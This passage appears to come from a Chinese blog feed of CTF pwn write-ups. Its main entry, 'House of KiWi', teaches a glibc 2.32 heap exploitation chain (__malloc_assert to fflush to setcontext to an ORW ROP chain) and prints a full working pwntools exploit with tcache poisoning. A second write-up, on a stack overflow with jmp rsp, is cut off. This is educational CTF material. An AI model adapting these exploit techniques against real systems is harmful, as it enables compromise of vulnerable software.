pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of KiWi</title>
      <link href="/2023/04/18/House-of-KiWi/"/>
      <url>/2023/04/18/House-of-KiWi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一种基于setcontext来在开启沙盒的堆题中实现orw的利用链</p><p>对于libc2.29以后的版本 setcontext控制rsp寄存器的值由rdi寄存器转化为了rdx寄存器</p><p>相比之很容易控制的rdi寄存器 rdx寄存器要想修改为我们预期的值 还是比较麻烦的</p><p>我们之前有提到的一种办法是利用libc文件中可以借rdi寄存器来控制rdx寄存器  但是今天这条链可以直接控制rdx寄存器</p><p>下面就来学习一下 </p><h2 id="实现逻辑分析"><a href="#实现逻辑分析" class="headerlink" title="实现逻辑分析"></a>实现逻辑分析</h2><p>整条链的实现逻辑主要是基于fflush(stderr)这个函数的调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304182223769.png" title="image-20230418222309660" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304182223769.png" alt="image-20230418222309660"></a></p><p>函数的内部调用了_IO_file_sync函数  并且其rdx寄存器的值恒为 _IO_helper_jumps<br>由图上我们很容易能看出IO_file_sync函数的调用是基于rbp寄存器的寻址 而rbp寄存器的值恒为IO_file_jumps 所以如果我们能够修改其地址+0x60处为setcontext 即可 并且rdx寄存器此时的值也被我们熟知 如果我们修改其+0xa0和0xa8处为相对的地址 就可以达到劫持程序执行流的目的（setcontext部分的知识本文不会重复介绍）</p><p>问题在于如何调用到fllush函数  </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>assert是一个断言函数 实际作用和if差不多 起到判断的作用 通过调用assert函数可以涉及到__malloc_assert函数的调用</p><p>所以此时我们的目标转化为调用assert函数</p><p>一共有两种办法 一种是基于top chunk 一种是基于largebin chunk</p><h3 id="通过top-chunk"><a href="#通过top-chunk" class="headerlink" title="通过top chunk"></a>通过top chunk</h3><p>先来讲前者</p><p>我们知道 对于小于阈值的chunk 如果bin中没有合适的chunk 就会从top chunk中分割来分配</p><p>如果申请的chunk大小比top chunk大呢 这种情况top chunk就会调用sysmalloc函数</p><p>在这个函数中 存在着对于assert的调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>我们来进行源码调试 这样可以更好的理解这个判断式</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191307561.png" title="image-20230419130716458" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191307561.png" alt="image-20230419130716458"></a></p><p>转化为汇编形式 实际上就是对应着这四个判断 只有成功跳转到sysmalloc+1829 &lt;sysmalloc+1829&gt; 才能够触发__malloc_assert函数</p><p>首先第一个cmp判断  对比r14寄存器的值和rsp+8处的内容</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191310392.png" title="image-20230419131030362" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191310392.png" alt="image-20230419131030362"></a></p><p>显然前者小于后者 并且这个判断式是固然的 不会因为用户的操作而改变(常规情况下)</p><p>此时ZF标志位为0 jnz跳转</p><p>第二个cmp判断 对比r12寄存器和0x1f 这里的0x1f实际上也就是最小chunk大小-1 用来判断top chunk剩余的size还够不够组成一个chunk</p><p>此时r12寄存器的值为</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191315614.png" title="image-20230419131511589" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191315614.png" alt="image-20230419131511589"></a></p><p>这个值其实不是固定的 还得根据你覆盖top chunk的size来决定 比如此时我覆盖top chunk的size就是0x100</p><p>如果我们此时就覆盖top chunk的size小于0x1f 那么CF标志位就会被设置为1</p><p>jbe就会跳转  不过这样就看不到第三个判断式了 所以我并未选择在此处跳转 我们来看一下第三个判断</p><p>利用test指令将al寄存器与1进行与运算 如果al寄存器的值为1 那么与运算的结果为1 ZF寄存器为0</p><p>此时je也不会跳转 al寄存器是ax寄存器的低8位 而ax寄存器是eax寄存器的低16位 eax寄存器是rax寄存器的低32位</p><p>所以此时al寄存器的值差不多就是size域的Inuse位吧 差不多可以这么理解  这里其实Inuse位设置为0就能跳转了 但是同上对吧 我还需要演示第四个判断</p><p>首先是利用lea 赋值r13-1给rax</p><p>随后test 把r11和rax进行与运算</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191334949.png" title="image-20230419133413922" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191334949.png" alt="image-20230419133413922"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191335526.png" title="image-20230419133512510" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191335526.png" alt="image-20230419133512510"></a></p><p>这里的rax固定是0x1000-1 0x1000是一页的大小 r11则为top chunk的首地址</p><p>其实这里的与运算结果是必定不为0的 ZF标志位为0 jne跳转</p><p>上面的四个判断 总结下来 其实只要我们覆盖top chunk的size域 使其大小不足以分配我们申请的大chunk即可  就能进入__malloc_assert函数 不需要像网上其他教程所说的一定要修改Inuse位</p><h3 id="通过largebin-chunk"><a href="#通过largebin-chunk" class="headerlink" title="通过largebin chunk"></a>通过largebin chunk</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br></pre></td></tr></table></figure><p>主要是通过这段源码中的assert函数  触发的条件是释放一个chunk到largebin中</p><p>并且对应链表中已经存在一个chunk  还是来源码调试 看一看需要满足什么样的判断才能进入__malloc_assert函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191702107.png" title="image-20230419170217019" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304191702107.png" alt="image-20230419170217019"></a></p><p>将r12+8赋值给rax 此时r12的值为链表中已经存在的chunk的首地址 +8处则为size域</p><p>接着将al寄存器和4进行与运算</p><p>此时al寄存器的值为size域的最后一个字节 此时我的值为0x25</p><p>这里可能存在疑问 为什么是5结尾 常规的chunk不是根据Inuse位有所不同吗 但也仅仅只是0和1</p><p>这里是因为要想和4进行与运算后 ZF标志位为0 使得jnz能够跳转 就需要相应的倒数第三位值为1 才能满足条件</p><p>而倒数第三位为1也就是增加了4 所以此时在0x21的基础上需要加上4 也就得到了0x25</p><p>随后就可以成功跳转 执行__malloc_assert函数 所以通过largebin bin来执行malloc_assert函数的关键在于修改链表中的chunk的size域倒数第三位为1</p><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>下面演示的程序由本人自己编写  存在许多明显漏洞 包括但不限于UAF 堆溢出 其他比赛题目需要根据真实情况作修改 下文不做模板使用</p><p>演示虚拟机:ubuntu22.04  使用的libc版本为libc2.32</p><p>首先 获取要用到的一些地址 libc由我程序自带的漏洞函数泄露</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = get_libc()</span><br><span class="line">setcontext_addr = libc_addr + <span class="number">0x5306D</span></span><br><span class="line">IO_helper_jumps = libc_addr + <span class="number">0x1e48c0</span></span><br><span class="line">IO_file_jumps = libc_addr  + <span class="number">0x1e54c0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x0000000000114161</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">success(<span class="built_in">hex</span>(rdi_addr))</span><br></pre></td></tr></table></figure><p>接着 按照上面所说的 我们需要利用fllush函数中涉及到的call qword ptr [rbp+0x60]</p><p>而rbp的值默认为IO_file_jumps 所以只需要利用任意写修改IO_file_jumps+0x60处为想要调用的地址 这里也就是setcontext+61</p><p>我采用的办法是tcache attack 不过由于libc2.32新增了fd异或 所以需要先泄露堆地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64((IO_file_jumps+<span class="number">0x60</span>)^key))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">8</span>,p64(setcontext_addr))</span><br></pre></td></tr></table></figure><p>其次是设定rdx+0xa0和0xa8处为我们想要的数据 以此来控制rsp寄存器和最后ret返回的地址</p><p>默认开启了沙盒 所以此时我们构造的rop链采用orw的形式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">8</span>,p64((IO_helper_jumps+<span class="number">0xa0</span>)^key))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">flag_addr = key*<span class="number">0x1000</span> + <span class="number">0x310</span></span><br><span class="line">success(<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdx_r12_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdx_r12_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">chunk8_addr = key*<span class="number">0x1000</span>+<span class="number">0x340</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x10</span>,p64(chunk8_addr)+p64(ret_addr))</span><br></pre></td></tr></table></figure><p>最后就是通过修改修改largebin chunk的size域 以及来触发__malloc_assert函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x420</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x420</span>)<span class="comment">#13</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x425</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4013EF&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>)<span class="comment">#14</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>如果采用的是修改top chunk的size域 使其不够分配chunk 进入sysmalloc函数 则为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#9</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x101</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4013EF&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>完整esp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Come back!&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    libc_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line">libc_addr = get_libc()</span><br><span class="line">setcontext_addr = libc_addr + <span class="number">0x5306D</span></span><br><span class="line">IO_helper_jumps = libc_addr + <span class="number">0x1e48c0</span></span><br><span class="line">IO_file_jumps = libc_addr  + <span class="number">0x1e54c0</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x0000000000114161</span></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">success(<span class="built_in">hex</span>(rdi_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64((IO_file_jumps+<span class="number">0x60</span>)^key))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">8</span>,p64(setcontext_addr))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">8</span>,p64((IO_helper_jumps+<span class="number">0xa0</span>)^key))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">8</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">flag_addr = key*<span class="number">0x1000</span> + <span class="number">0x310</span></span><br><span class="line">success(<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdx_r12_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">1</span>)+p64(rsi_addr)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdx_r12_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">chunk8_addr = key*<span class="number">0x1000</span>+<span class="number">0x340</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x10</span>,p64(chunk8_addr)+p64(ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x10)#9</span></span><br><span class="line"><span class="comment"># payload = cyclic(0x18)+p64(0x101)</span></span><br><span class="line"><span class="comment"># edit(9,len(payload),payload)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4013EF&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line"><span class="comment"># add(0x1000)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x420</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x420</span>)<span class="comment">#13</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x425</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4013EF&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>)<span class="comment">#14</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF2023</title>
      <link href="/2023/04/17/GDOUCTF2023/"/>
      <url>/2023/04/17/GDOUCTF2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次的pwn出的比较简单 也就最后一题值得拿来说一说 但是其本质也就是非常简单的手写shellcode</p><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172217974.png" title="image-20230417221710882" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172217974.png" alt="image-20230417221710882"></a></p><p>保沙盒护基本全关了  但是开启了沙盒  ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v7 = <span class="number">100</span>;</span><br><span class="line">  sandbox();</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input a guess num:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good guys&quot;</span>);</span><br><span class="line">      vulnerable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no,no,no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察了一个伪随机数 用时间当种子 对的话就进入vulnerable函数  伪随机数考烂了都 这里就不讲了</p><p>直接来看vulnerable函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your door&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当纯的一个栈溢出漏洞  不过观察了函数表  还发现了个haha函数 里面有一个jmp rsp指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040094A haha            proc near</span><br><span class="line">.text:000000000040094A ; __unwind &#123;</span><br><span class="line">.text:000000000040094A                 push    rbp</span><br><span class="line">.text:000000000040094B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040094E                 jmp     rsp</span><br><span class="line">.text:000000000040094E haha            endp</span><br></pre></td></tr></table></figure><p>那么很明显了  没有开启NX保护机制  再加上有jmp rsp 